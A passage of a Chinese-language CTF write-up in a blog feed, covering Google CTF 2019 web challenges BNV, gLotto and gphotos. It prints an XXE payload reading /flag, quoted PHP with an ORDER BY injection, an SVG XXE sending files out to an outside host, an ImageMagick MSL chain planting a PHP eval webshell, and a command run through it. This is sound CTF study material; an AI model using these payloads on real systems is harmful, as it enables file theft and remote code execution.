rel="noopener">《使用本地DTD文件来利用XXE漏洞实现任意结果输出》</a></p><p>所以构造如下paylaod对flag进行读取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /api/search HTTP/1.1</span><br><span class="line">Host: bnv.web.ctfcompetition.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://bnv.web.ctfcompetition.com/</span><br><span class="line">Content-type: application/xml</span><br><span class="line">Content-Length: 374</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % ISOamsa &apos;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error;</span><br><span class="line">&apos;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/07/18/5d30312f2941885347.png" alt="2EE1BB38-CEDE-41D0-B076-A55759EC0FFD.png"></p><p>最后分享一个<a href="https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html" target="_blank" rel="noopener">XXE cheat sheet</a> &lt;—有点老了，感觉可以把我的也整理一下发一发？随后有时间再整理吧。</p><h2 id="0x02-gLotto"><a href="#0x02-gLotto" class="headerlink" title="0x02 gLotto"></a>0x02 gLotto</h2><p>题目描述：</p><p>Are you lucky?</p><p>题目链接：</p><p><a href="https://glotto.web.ctfcompetition.com/" target="_blank" rel="noopener">https://glotto.web.ctfcompetition.com/</a></p><p>题目解答：</p><p>点击页面右下角可以看到页面的源码，具体的链接是</p><p><a href="https://glotto.web.ctfcompetition.com/?src" target="_blank" rel="noopener">https://glotto.web.ctfcompetition.com/?src</a></p><p>从源码中分析我们可以得到以下几点：</p><ol><li>orderx参数拼接可造注入</li><li>orderx对应四个表，轮换查询</li><li>每次生成的session会存入数据库中</li><li>提交的code跟session相同就可以得到flag，而且判断完就销毁session</li></ol><p>那么解决问题的关键就是利用注入来获取到之前设置的session值，而且要通过四次orderx参数的注入（order by注入）来完成。</p><p>接下来采用数学的方法来解决这个问题</p><p><a href="https://cfreal.github.io/google-ctf-2019-glotto-writeup.html" target="_blank" rel="noopener">https://cfreal.github.io/google-ctf-2019-glotto-writeup.html</a></p><p>Exp：<br><a href="https://github.com/cfreal/exploits/tree/master/gctf-2019-glotto" target="_blank" rel="noopener">https://github.com/cfreal/exploits/tree/master/gctf-2019-glotto</a></p><p>题目的关键部分代码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'config.php'</span>);</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'watchdog.php'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gen_winner</span><span class="params">($count, $charset=<span class="string">'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $len = strlen($charset);</span><br><span class="line">        $rand = openssl_random_pseudo_bytes($count);</span><br><span class="line">        $secret = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $count; $i++)</span><br><span class="line">        &#123;</span><br><span class="line">            $secret .= $charset[ord($rand[$i]) % $len];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'src'</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(highlight_string(file_get_contents(<span class="keyword">__FILE__</span>)));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'code'</span>])) &#123;</span><br><span class="line">        session_start();</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'winner'</span>])) <span class="keyword">die</span>;</span><br><span class="line">        $win = $_SESSION[<span class="string">'winner'</span>];</span><br><span class="line">        <span class="keyword">unset</span>($_SESSION[<span class="string">'winner'</span>]);</span><br><span class="line">        session_destroy();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($_POST[<span class="string">'code'</span>] === $win)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"You won! $flag"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            sleep(<span class="number">5</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"You didn't win :(&lt;br&gt;The winning ticket was $win"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    $tables = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'march'</span>,</span><br><span class="line">        <span class="string">'april'</span>,</span><br><span class="line">        <span class="string">'may'</span>,</span><br><span class="line">        <span class="string">'june'</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    $winner = gen_winner(<span class="number">12</span>);</span><br><span class="line">    $_SESSION[<span class="string">'winner'</span>] = $winner;</span><br><span class="line"></span><br><span class="line">    $db = <span class="keyword">new</span> mysqli(<span class="keyword">null</span>, $dbuser, $dbpass, $dbname, <span class="keyword">null</span>, $socket);</span><br><span class="line">    <span class="comment">//$db = new mysqli($dbhost, $dbuser, $dbpass, $dbname);</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ($db-&gt;connect_errno) &#123;</span><br><span class="line">        printf(<span class="string">"Connect failed: %s\n"</span>, $db-&gt;connect_error);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line">    $db-&gt;query(<span class="string">"SET @lotto = '$winner'"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($tables); $i++)</span><br><span class="line">    &#123;</span><br><span class="line">        $order = <span class="keyword">isset</span>($_GET[<span class="string">"order&#123;$i&#125;"</span>]) ? $_GET[<span class="string">"order&#123;$i&#125;"</span>] : <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span> (stripos($order, <span class="string">'benchmark'</span>) !== <span class="keyword">false</span>) <span class="keyword">die</span>;</span><br><span class="line">        $&#123;<span class="string">"result$i"</span>&#125; = $db-&gt;query(<span class="string">"SELECT * FROM &#123;$tables[$i]&#125; "</span> . ($order != <span class="string">''</span> ? <span class="string">"ORDER BY `"</span>.$db-&gt;escape_string($order).<span class="string">"`"</span> : <span class="string">""</span>));</span><br><span class="line">        <span class="keyword">if</span> (!$&#123;<span class="string">"result$i"</span>&#125;) <span class="keyword">die</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><h2 id="0x03-gphotos"><a href="#0x03-gphotos" class="headerlink" title="0x03 gphotos"></a>0x03 gphotos</h2><p>题目描述：</p><p>Upload your photoz. FYI: /info.php</p><p>题目链接：</p><p><a href="http://gphotos.ctfcompetition.com:1337/" target="_blank" rel="noopener">http://gphotos.ctfcompetition.com:1337/</a></p><p>题目解析：</p><p>首先右键源码看源码就额可以看到这个上传功能对应的后端PHP代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://gphotos.ctfcompetition.com:1337/?action=src</span><br></pre></td></tr></table></figure></p><p>通过阅读代码可以发现以下几点：</p><ol><li><code>mime_content_type</code>来检测文件的MIME类型并且限制了只能是<code>image/gif</code>, <code>image/png</code>, <code>image/jpeg</code>, <code>image/svg+xml</code> 这四种类型。</li><li>之后使用<code>get_size</code>函数，这个函数对<code>image/png</code>, <code>image/jpeg</code>,会检测大小，如果是其它类型就当做xml文件来处理。</li><li>在之后就是利用<code>thumbnail</code>函数来得到缩略图，这其中就使用了ImageMagick的 convert命令。</li><li>上传文件会被移动到upload目录下，并且后缀是根据对应的MIME类型进行拼接的，文件名是md5之后的hash值，而且图片是经过转换之后的缩略图，所以在图片里面藏shell代码基本不可能的了。</li></ol><p>但是目标可以处理svg图，<del>那么就明显是要使用XXE漏洞来达到攻击的目的了。</del> XXE只是帮助我获取ImageMagick的配置文件，这里有一个小trick，就是在带外传输数据的时候如何传输过长的数据。</p><p>上传如下svg图</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line"> &lt;!DOCTYPE foo [  </span><br><span class="line">   &lt;!ELEMENT svg ANY &gt;</span><br><span class="line">   &lt;!ENTITY % remote SYSTEM &quot;http://bushwhackers.ru:8003/ev.xml&quot; &gt;</span><br><span class="line">%remote;%template;</span><br><span class="line">   ]&gt;&lt;svg&gt;&amp;res;&lt;/svg&gt;</span><br></pre></td></tr></table></figure><p>ev.xml文件的内容如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % secret SYSTEM &quot;THING_TO_STEAL&quot; &gt;</span><br><span class="line">&lt;!ENTITY % template &quot;&lt;!ENTITY res SYSTEM &apos;http://bushwhackers.ru:8003/a?%secret;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>但是此时的ev.xml对于直接传输一个文件而言还是不好用，所以借助php的伪协议来助攻一下。总之就是压缩之后进行base64</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % secret SYSTEM &quot;php://filter/convert.base64-encode/resource=php://filter/zlib.deflate/resource=file:///etc/ImageMagick-6/policy.xml&quot; &gt;</span><br><span class="line">&lt;!ENTITY % template &quot;&lt;!ENTITY res SYSTEM &apos;http://bushwhackers.ru:8003/a?%secret;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>之后的paylaod还是借助ImageMagick在处理特殊的msl文件时会执行其中的命令来触发(这个特性好像只在debain上存在)，具体的攻击流程如下：</p><p>首先使用如下命令生成包含webshell的png，上传之后主页会返回路径和文件名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert -size 100x100 -comment &apos;&lt;?php eval($_GET[&quot;cmd&quot;]); ?&gt;&apos; rgba:/dev/urandom[0] shell.png</span><br></pre></td></tr></table></figure></p><p>返回内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/upload/&lt;hash&gt;/&lt;image&gt;.png</span><br></pre></td></tr></table></figure></p><p>PS: 注意使用bash不要用zsh</p><p>之后上传我们的svg图<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!-- &lt;svg&gt; --&gt;</span><br><span class="line">&lt;image&gt;</span><br><span class="line">  &lt;read filename=&quot;/var/www/html/upload/&lt;hash&gt;/&lt;image&gt;.png&quot; /&gt;</span><br><span class="line">  &lt;write filename=&quot;/var/www/html/upload/shell_huihui.php&quot; /&gt;</span><br><span class="line">  &lt;svg width=&quot;120px&quot; height=&quot;120px&quot;&gt;</span><br><span class="line">    &lt;image href=&quot;/var/www/html/upload/&lt;hash&gt;/&lt;image&gt;.png&quot; /&gt;</span><br><span class="line">  &lt;/svg&gt;</span><br><span class="line">&lt;/image&gt;</span><br></pre></td></tr></table></figure></p><p>返回内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/upload/&lt;hash&gt;/&lt;image2&gt;.svg</span><br></pre></td></tr></table></figure></p><p>最后再上传如下的svg来将上一个svg内容进行执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;svg width=&quot;120px&quot; height=&quot;120px&quot;&gt;</span><br><span class="line">  &lt;image width=&quot;120&quot; height=&quot;120&quot; href=&quot;msl:/var/www/html/upload/&lt;hash&gt;/&lt;image2&gt;.svg&quot; /&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure></p><p>最后执行在webroot目录下的webshell即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://gphotos2.ctfcompetition.com:1337/upload/shell_huihui.php?cmd=system(&apos;/get_flag&apos;)</span><br></pre></td></tr></table></figure><p>这里学到的几个点：</p><ol><li>XXE带外传输大文件的方法</li><li>Debians+不安全的ImageMagick配置将会导致href标签的伪协议读文件或者是配合msl文件执行命令</li></ol><p>like<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;svg width=&quot;120px&quot; height=&quot;120px&quot;&gt;</span><br><span class="line">  &lt;image width=&quot;120&quot; height=&quot;120&quot; href=&quot;text:/etc/passwd&quot; /&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure></p><p>网站的关键源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'config.php'</span>);</span><br><span class="line">error_reporting( E_ALL );</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="comment">// totally not copy&amp;pasted from somewhere...</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_size</span><span class="params">($file, $mime_type)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($mime_type == <span class="string">"image/png"</span>||$mime_type == <span class="string">"image/jpeg"</span>) &#123;</span><br><span class="line">        $stats = getimagesize($file);</span><br><span class="line">        $width = $stats[<span class="number">0</span>];</span><br><span class="line">        $height = $stats[<span class="number">1</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $xmlfile = file_get_contents($file);</span><br><span class="line">        $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">        $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">        $svg = simplexml_import_dom($dom);</span><br><span class="line">        $attrs = $svg-&gt;attributes();</span><br><span class="line">        $width = (int) $attrs-&gt;width;</span><br><span class="line">        $height = (int) $attrs-&gt;height;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> [$width, $height];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">workdir</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $d = <span class="string">'upload/'</span>.md5(session_id());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!is_dir($d))</span><br><span class="line">        mkdir($d);</span><br><span class="line">    <span class="keyword">return</span> $d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">list_photos</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $d = <span class="string">'upload/'</span>.md5(session_id());</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (!is_dir($d)) <span class="keyword">return</span> [];</span><br><span class="line"></span><br><span class="line">    $result = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(glob(<span class="string">"&#123;$d&#125;/*.*"</span>) <span class="keyword">as</span> $f) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strrpos($f, <span class="string">'small'</span>) === <span class="keyword">FALSE</span>)</span><br><span class="line">            $result[basename($f)] = $f;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_FILES[<span class="string">'photo'</span>]))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    $p = <span class="keyword">new</span> PhotoUpload($_FILES[<span class="string">'photo'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">    $p-&gt;thumbnail();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PhotoUpload</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $failed = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">        $formats = [</span><br><span class="line">            <span class="string">"image/gif"</span> =&gt; <span class="string">"gif"</span>,</span><br><span class="line">            <span class="string">"image/png"</span> =&gt; <span class="string">"png"</span>,</span><br><span class="line">            <span class="string">"image/jpeg"</span> =&gt; <span class="string">"jpg"</span>,</span><br><span class="line">            <span class="string">"image/svg+xml"</span> =&gt; <span class="string">"svg"</span>,</span><br><span class="line">            <span class="comment">// Uncomment when launching gVideoz</span></span><br><span class="line">            <span class="comment">//"video/mp4" =&gt; "mp4",</span></span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $mime_type = mime_content_type($path);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!array_key_exists($mime_type, $formats)) &#123;</span><br><span class="line">            <span class="keyword">die</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $size = get_size($path, $mime_type);</span><br><span class="line">        <span class="keyword">if</span> ($size[<span class="number">0</span>] * $size[<span class="number">1</span>] &gt; <span class="number">65536</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext = $formats[$mime_type];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = hash_hmac(<span class="string">'md5'</span>, uniqid(), $secret).<span class="string">".&#123;$this-&gt;ext&#125;"</span>;</span><br><span class="line"></span><br><span class="line">        move_uploaded_file($path, workdir().<span class="string">"/&#123;$this-&gt;name&#125;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">thumbnail</span><span class="params">()</span> </span>&#123;</span><br><span class="line">         exec(escapeshellcmd(<span class="string">'convert '</span>.workdir().<span class="string">"/&#123;$this-&gt;name&#125;"</span>.<span class="string">' -resize 128x128 '</span>.workdir().<span class="string">"/&#123;$this-&gt;name&#125;_small.jpg"</span>), $out, $ret);</span><br><span class="line">         <span class="keyword">if</span> ($ret)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;failed = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;failed) &#123;</span><br><span class="line">            shell_exec(escapeshellcmd(<span class="string">'rm '</span>.workdir().<span class="string">"/&#123;$this-&gt;name&#125;"</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>])) &#123;</span><br><span class="line">    <span class="keyword">switch</span> ($_GET[<span class="string">'action'</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'upload'</span>:</span><br><span class="line">            upload();</span><br><span class="line">            header(<span class="string">'Location: ?'</span>);</span><br><span class="line">            <span class="keyword">die</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'src'</span>:</span><br><span class="line">            show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">die</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;gPhotoz&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">            &lt;form action=<span class="string">"?action=upload"</span> method=<span class="string">"POST"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">                &lt;input type=<span class="string">"file"</span> name=<span class="string">"photo"</span>&gt;&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Upload"</span>&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span> <span class="keyword">foreach</span>(list_photos() <span class="keyword">as</span> $name =&gt; $path): <span class="meta">?&gt;</span></span><br><span class="line">            &lt;div&gt;</span><br><span class="line">                &lt;a href=<span class="string">"&lt;?=$path?&gt;"</span> alt=<span class="string">"&lt;?=$name?&gt;"</span>&gt;&lt;img src=<span class="string">"&lt;?=$path.'_small.jpg'?&gt;"</span>&gt;&lt;/a&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span> <span class="keyword">endforeach</span> <span class="meta">?&gt;</span></span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line"></span><br><span class="line">    &lt;a href=<span class="string">"?action=src"</span>&gt;&lt;/a&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;写篇复盘的小水文&lt;br&gt;文章首发在合天公众号，转载请注意&lt;/p&gt;
&lt;h2 id=&quot;0x01-BNV&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Razzer-Finding Kernel Race Bugs through Fuzzing</title>
    <link href="http://zer0yu.github.io/2019/06/30/Razzer-Finding-Kernel-Race-Bugs-through-Fuzzing/"/>
    <id>http://zer0yu.github.io/2019/06/30/Razzer-Finding-Kernel-Race-Bugs-through-Fuzzing/</id>
    <published>2019-06-30T13:12:32.000Z</published>
    <updated>2019-06-30T13:18:15.000Z</updated>
    
